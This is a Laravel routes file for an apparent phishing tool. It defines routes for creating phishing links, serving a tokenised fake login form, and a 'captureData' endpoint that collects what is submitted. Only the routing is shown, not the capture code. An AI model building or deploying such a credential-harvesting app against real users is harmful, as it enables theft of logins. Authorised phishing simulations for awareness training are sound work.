<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingLinkController;

Route::get('/', function () {
    return view('welcome');
});

Route::get('/link/create', [PhishingLinkController::class, 'create'])->name('link.create');
Route::post('/link/store', [PhishingLinkController::class, 'store'])->name('link.store');
Route::get('/login/{token}', [PhishingLinkController::class, 'showForm'])->name('login.form');
Route::post('/login/{token}', [PhishingLinkController::class, 'captureData'])->name('login.capture');
